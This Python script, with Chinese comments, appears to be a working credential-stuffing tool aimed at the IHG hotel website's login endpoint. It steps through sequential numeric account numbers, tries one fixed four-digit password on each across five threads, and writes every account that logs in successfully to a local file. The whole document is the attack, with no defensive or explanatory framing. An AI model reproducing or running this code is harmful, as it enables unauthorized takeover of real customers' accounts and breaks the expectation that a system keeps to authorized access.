from multiprocessing.pool import ThreadPool

import requests
import json
from _actor import Actor

class AuthCertificate(object):
    def __init__(self,userName,password,cookieFlag):
        self.userName = userName
        self.password  = password
        self.cookieFlag = cookieFlag

    def toJson(self):
        return {
            "username":self.userName,
            "password":self.password,
            "cookieFlag":self.cookieFlag,
        }



def _parseAccountDict(response):
    status = response.get('status')
    if status == 'SUCCESS':
        save_account(response['loginCredentials'])
    else:
        pass


def save_account(account_credentials):
    userName = account_credentials['username']
    password = account_credentials['password']
    account_txt = '账号{} 密码{}'.format(userName,password)
    print(account_txt)
    actor.send(account_txt)


class SaveAccountActor(Actor):
    def run(self):
        with open('account.txt','a+',encoding='utf-8') as f:
            while True:
                msg = self.recv()
                print('收到消息{}'.format(msg))
                f.write(msg)
                f.flush()


actor = SaveAccountActor()


def _request(account,password):
    auth_json = {
        'username':account,
        'password':password,
        'cookieFlag':False
    }
    try:
        response = requests.post('https://www.ihg.com/gs-json/cn/zh/login',json=auth_json)
    except Exception as e:
        print('发生{} 跳过账号 {}'.format(e.__traceback__,account))
        return None
    return json.loads(str(response.content,encoding='utf-8'))

def spider_task(account_start,account_end,pwd):
    for account in range(account_start,account_end):
        response = _request(str(account),str(pwd))
        if response:
            _parseAccountDict(response)

if __name__ == '__main__':
    pool = ThreadPool(5)
    # startAccount = int(input('输入 起始账号\n'))
    # endAccount = int(input('输入 结束账号\n'))
    # pwd = input('输入测试密码\n')
    # 测试代码
    startAccount = 324577565
    endAccount = 324577570
    pwd = '0822'
    accountSize = endAccount - startAccount
    partLen = accountSize//5
    args_map =[]

    actor.start()

    for i in range(5):
        args_map.append((startAccount+i*partLen,startAccount+(i+1)*partLen,pwd))
    pool.starmap(spider_task,args_map)
    print('测试中 ...')
